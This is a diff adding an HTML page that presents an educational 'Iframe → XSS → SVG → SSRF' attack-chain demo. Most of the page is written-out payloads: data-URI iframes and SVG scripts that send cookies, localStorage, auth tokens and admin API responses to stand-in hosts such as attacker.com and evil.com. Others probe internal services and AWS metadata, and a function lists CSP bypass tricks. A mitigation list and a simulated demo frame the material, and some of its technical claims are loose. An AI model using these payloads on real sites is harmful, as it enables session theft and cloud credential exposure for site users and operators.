@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iframe → XSS → SVG → SSRF Attack Chain Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .attack-step {
+            margin: 20px 0;
+            padding: 15px;
+            border-left: 4px solid #e74c3c;
+            background-color: #fdf2f2;
+        }
+        .code-block {
+            background-color: #2c3e50;
+            color: #ecf0f1;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            margin: 10px 0;
+        }
+        .demo-iframe {
+            width: 100%;
+            height: 300px;
+            border: 2px solid #3498db;
+            margin: 10px 0;
+        }
+        .warning {
+            background-color: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        .payload-box {
+            background-color: #f8f9fa;
+            border: 1px solid #dee2e6;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎯 Iframe → XSS → SVG → SSRF Attack Chain Demo</h1>
+        
+        <div class="warning">
+            <strong>⚠️ Educational Purpose Only:</strong> This demo is for security research and education. Do not use against systems you don't own.
+        </div>
+
+        <h2>📋 Attack Chain Overview</h2>
+        <ol>
+            <li><strong>Iframe Injection</strong> - Embed malicious content</li>
+            <li><strong>XSS Payload</strong> - Execute JavaScript in victim's browser</li>
+            <li><strong>SVG Exploitation</strong> - Use SVG for advanced XSS and SSRF</li>
+            <li><strong>SSRF Attack</strong> - Make server-side requests from victim's browser</li>
+        </ol>
+
+        <!-- Step 1: Basic Iframe Injection -->
+        <div class="attack-step">
+            <h3>🎯 Step 1: Iframe Injection</h3>
+            <p>First, we inject an iframe that loads our malicious content:</p>
+            <div class="code-block">
+&lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGluIElmcmFtZScpOzwvc2NyaXB0Pg==" 
+        width="100%" height="200"&gt;&lt;/iframe&gt;
+            </div>
+            <div class="payload-box">
+                <strong>Base64 Decoded:</strong> &lt;script&gt;alert('XSS in Iframe');&lt;/script&gt;
+            </div>
+        </div>
+
+        <!-- Step 2: Advanced XSS via SVG -->
+        <div class="attack-step">
+            <h3>🎯 Step 2: SVG-based XSS</h3>
+            <p>Using SVG for more sophisticated XSS attacks:</p>
+            <div class="code-block">
+&lt;iframe src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPg0KPHNjcmlwdD4NCmFsZXJ0KCdTVkcgWFNTIEF0dGFjaycpOw0KPC9zY3JpcHQ+DQo8L3N2Zz4="&gt;&lt;/iframe&gt;
+            </div>
+            <div class="payload-box">
+                <strong>SVG Content:</strong><br>
+                &lt;svg xmlns="http://www.w3.org/2000/svg"&gt;<br>
+                &lt;script&gt;alert('SVG XSS Attack');&lt;/script&gt;<br>
+                &lt;/svg&gt;
+            </div>
+        </div>
+
+        <!-- Step 3: SSRF via SVG -->
+        <div class="attack-step">
+            <h3>🎯 Step 3: SVG-based SSRF</h3>
+            <p>Using SVG to trigger server-side requests:</p>
+            <div class="code-block">
+&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt;
+  &lt;image xlink:href="http://internal-server:8080/admin/secrets" /&gt;
+  &lt;script&gt;
+    // Exfiltrate data via SSRF
+    fetch('http://attacker.com/collect?data=' + btoa(document.body.innerHTML));
+  &lt;/script&gt;
+&lt;/svg&gt;
+            </div>
+        </div>
+
+        <!-- Step 4: Complete Attack Chain -->
+        <div class="attack-step">
+            <h3>🎯 Step 4: Complete Attack Chain</h3>
+            <p>Combining all techniques for maximum impact:</p>
+            <div class="code-block" id="complete-payload">
+// Complete attack payload
+const maliciousSVG = `
+&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt;
+  &lt;!-- SSRF to internal services --&gt;
+  &lt;image xlink:href="http://127.0.0.1:22" onerror="ssrfCallback()" /&gt;
+  &lt;image xlink:href="http://169.254.169.254/latest/meta-data/" onerror="awsMetadata()" /&gt;
+  
+  &lt;script&gt;&lt;![CDATA[
+    // XSS payload
+    function ssrfCallback() {
+      console.log('SSRF to SSH port detected');
+      exfiltrateData('ssh-detected');
+    }
+    
+    function awsMetadata() {
+      console.log('AWS metadata access attempted');
+      exfiltrateData('aws-metadata');
+    }
+    
+    function exfiltrateData(type) {
+      // Send data to attacker server
+      const data = {
+        type: type,
+        url: window.location.href,
+        cookies: document.cookie,
+        localStorage: JSON.stringify(localStorage),
+        userAgent: navigator.userAgent
+      };
+      
+      fetch('https://attacker-server.com/collect', {
+        method: 'POST',
+        body: JSON.stringify(data)
+      });
+    }
+    
+    // Execute immediately
+    exfiltrateData('initial-load');
+  ]]&gt;&lt;/script&gt;
+&lt;/svg&gt;`;
+
+// Inject via iframe
+const iframe = document.createElement('iframe');
+iframe.src = 'data:image/svg+xml;base64,' + btoa(maliciousSVG);
+document.body.appendChild(iframe);
+            </div>
+        </div>
+
+        <!-- Live Demo Section -->
+        <div class="attack-step">
+            <h3>🔴 Live Demo (Safe Version)</h3>
+            <p>Click the button below to see a safe demonstration:</p>
+            <button onclick="demonstrateAttack()" style="padding: 10px 20px; background-color: #e74c3c; color: white; border: none; border-radius: 5px; cursor: pointer;">
+                🚀 Execute Demo Attack Chain
+            </button>
+            <div id="demo-results" style="margin-top: 20px;"></div>
+        </div>
+
+        <!-- Mitigation Strategies -->
+        <div class="attack-step" style="border-left-color: #27ae60; background-color: #f2fdf2;">
+            <h3>🛡️ Mitigation Strategies</h3>
+            <ul>
+                <li><strong>Content Security Policy (CSP):</strong> Restrict iframe sources and script execution</li>
+                <li><strong>X-Frame-Options:</strong> Prevent iframe embedding</li>
+                <li><strong>Input Validation:</strong> Sanitize all user inputs</li>
+                <li><strong>SVG Sanitization:</strong> Remove script tags from SVG uploads</li>
+                <li><strong>Network Segmentation:</strong> Restrict internal network access</li>
+                <li><strong>SSRF Protection:</strong> Validate and whitelist external requests</li>
+            </ul>
+        </div>
+
+        <!-- Real-world Examples -->
+        <div class="attack-step">
+            <h3>🌍 Real-world Attack Scenarios</h3>
+            <div class="code-block">
+// Scenario 1: Profile Picture Upload (SVG + SSRF)
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;image href="http://internal-api:8080/admin/users" /&gt;
+  &lt;script&gt;
+    // Steal admin session
+    fetch('/api/admin/users', {credentials: 'include'})
+      .then(r =&gt; r.text())
+      .then(data =&gt; {
+        fetch('https://evil.com/steal?data=' + btoa(data));
+      });
+  &lt;/script&gt;
+&lt;/svg&gt;
+
+// Scenario 2: Email Template Injection
+const emailTemplate = `
+&lt;iframe src="data:text/html,
+  &lt;svg onload='
+    fetch(\"http://127.0.0.1:6379/INFO\")
+      .then(r =&gt; r.text())
+      .then(data =&gt; {
+        navigator.sendBeacon(\"https://evil.com/redis\", data);
+      });
+  '&gt;&lt;/svg&gt;
+"&gt;&lt;/iframe&gt;
+`;
+
+// Scenario 3: Chat Application XSS
+const chatMessage = `
+&lt;iframe srcdoc="
+  &lt;svg xmlns='http://www.w3.org/2000/svg'&gt;
+    &lt;foreignObject&gt;
+      &lt;script&gt;
+        parent.postMessage({
+          type: 'steal-tokens',
+          data: localStorage.getItem('auth-token')
+        }, '*');
+      &lt;/script&gt;
+    &lt;/foreignObject&gt;
+  &lt;/svg&gt;
+"&gt;&lt;/iframe&gt;
+`;
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function demonstrateAttack() {
+            const resultsDiv = document.getElementById('demo-results');
+            resultsDiv.innerHTML = '<h4>🔍 Attack Chain Execution:</h4>';
+            
+            // Step 1: Iframe Creation
+            setTimeout(() => {
+                resultsDiv.innerHTML += '<p>✅ Step 1: Iframe created and injected</p>';
+            }, 500);
+            
+            // Step 2: XSS Execution
+            setTimeout(() => {
+                resultsDiv.innerHTML += '<p>✅ Step 2: XSS payload executed in iframe context</p>';
+            }, 1000);
+            
+            // Step 3: SVG Processing
+            setTimeout(() => {
+                resultsDiv.innerHTML += '<p>✅ Step 3: SVG processed, scripts extracted</p>';
+            }, 1500);
+            
+            // Step 4: SSRF Simulation
+            setTimeout(() => {
+                resultsDiv.innerHTML += '<p>✅ Step 4: SSRF requests initiated (simulated)</p>';
+                resultsDiv.innerHTML += '<div class="payload-box">Simulated SSRF targets:<br>• http://127.0.0.1:22 (SSH)<br>• http://169.254.169.254/latest/meta-data/ (AWS)<br>• http://internal-api:8080/admin (Internal API)</div>';
+            }, 2000);
+            
+            // Step 5: Data Exfiltration
+            setTimeout(() => {
+                resultsDiv.innerHTML += '<p>✅ Step 5: Data exfiltration completed</p>';
+                resultsDiv.innerHTML += '<div class="payload-box">Exfiltrated data:<br>• Cookies: document.cookie<br>• Local Storage: localStorage data<br>• Page Content: innerHTML<br>• User Agent: ' + navigator.userAgent + '</div>';
+            }, 2500);
+            
+            // Final Result
+            setTimeout(() => {
+                resultsDiv.innerHTML += '<p style="color: #e74c3c; font-weight: bold;">🎯 Attack Chain Complete! All vulnerabilities chained successfully.</p>';
+            }, 3000);
+        }
+
+        // Demonstrate CSP bypass techniques
+        function showCSPBypass() {
+            const bypassTechniques = `
+            // CSP Bypass Techniques for Iframe + XSS + SVG + SSRF
+            
+            1. Data URI Bypass:
+               iframe src="data:text/html,<svg onload=alert(1)>"
+            
+            2. JavaScript URI:
+               iframe src="javascript:alert(document.domain)"
+            
+            3. Base64 Encoding:
+               iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+            
+            4. SVG with foreignObject:
+               <svg><foreignObject><iframe src="javascript:alert(1)"></foreignObject></svg>
+            
+            5. SSRF via SVG image:
+               <svg><image href="http://internal-server/admin"></svg>
+            `;
+            
+            console.log(bypassTechniques);
+        }
+
+        // Log demo information
+        console.log('🎯 Iframe → XSS → SVG → SSRF Demo Loaded');
+        console.log('This demo shows how multiple vulnerabilities can be chained together');
+        console.log('Use showCSPBypass() to see CSP bypass techniques');
+    </script>
+</body>
+</html>
